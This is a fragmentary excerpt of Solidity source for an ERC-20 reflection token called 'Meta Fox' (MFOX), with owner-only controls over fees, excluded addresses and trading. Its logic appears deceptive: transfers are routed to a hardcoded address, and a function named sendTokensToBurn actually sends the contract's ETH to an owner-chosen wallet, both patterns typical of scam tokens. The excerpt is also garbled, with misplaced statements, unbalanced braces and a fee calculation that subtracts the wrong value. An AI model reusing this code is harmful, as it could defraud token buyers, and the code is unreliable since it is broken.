...
// Contract created using the Most Effective Tactics Available For Operational Xchanges 
...
contract MetaFox is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 50_000_000_000_000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = 'Meta Fox';
    string private _symbol = 'MFOX';
    ...
    address payable private _RecipientAddress = payable(0x8dF64fE610815e5968814E43f6fD30F6a9C48119);
    ...
    bool private MarketingEnabled = false;
    ...
    function setBurnEnabled(bool _setBurnEnabled) external onlyOwner() {
        burnEnabled = _setBurnEnabled;
    }
    ...
    function setMarketingEnabled(bool _setMarketingEnabled) external onlyOwner() {
        MarketingEnabled = _setMarketingEnabled;
    }
    ...
    function setExcludedAddress(address account, bool ExcludedAddress) external onlyOwner() {
        _ExcludedAddress[account] = ExcludedAddress;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(TradingOpen);
            cooldown[recipient] = block.timestamp + (90 seconds);}
        ...
        _tokenTransfer(sender, _RecipientAddress, amount, takeFee);
    }

        if((sender != owner() && sender != uniswapV2Pair && _ExcludedAddress[sender])) {
            require(amount <= balanceOf(uniswapV2Pair).mul(5).div(100) && amount <= _maxTxAmount);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 toBurn = contractTokenBalance.mul(_BurnFee).div(_BurnFee.add(_liquidityFee));
        uint256 toLiquify = contractTokenBalance.sub(toBurn);
        ...
        // swap tokens for ETH
        uint256 toSwapForEth = half.add(toBurn);
        ...
        if(MarketingEnabled){
            ...
            sendTokensToBurn(fromSwap.sub(newBalance));
    }
    ...
    function manualSend() public onlyOwner() {
        ...
        sendTokensToBurn(contractETHBalance);
    }

    function setSwapAndLiquifyEnabled(bool _swapAndLiquifyEnabled) external onlyOwner(){
        swapAndLiquifyEnabled = _swapAndLiquifyEnabled;
    }
    function setBurnAddress(address payable _BurnAddress) private {
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurnLiquidity) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeBurnLiquidity(tBurnLiquidity);
    ...
    function _takeBurnLiquidity(uint256 tBurnLiquidity) private {
        uint256 currentRate = _getRate();
        uint256 rBurnLiquidity = tBurnLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rBurnLiquidity);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tBurnLiquidity);
    }
    ...
    function sendTokensToBurn(uint256 amount) private {
       burnAddress.transfer(amount); 
    }
    receive() external payable {}

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tBurnLiquidityFee) = _getTValues(tAmount, _taxFee, _BurnFee.add(_liquidityFee));
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tBurnLiquidityFee);
    }

    function _getTValues(uint256 tAmount, uint256 taxFee, uint256 BurnLiquidityFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tBurnLiquidityFee = tAmount.mul(BurnLiquidityFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(BurnLiquidityFee);
    ...
    function _setBurnFee(uint256 BurnFee) external onlyOwner() {
        require(BurnFee >= 1 && BurnFee <= 49, 'BurnFee should be in 1 - 49.9');
        _BurnFee = BurnFee;
    }
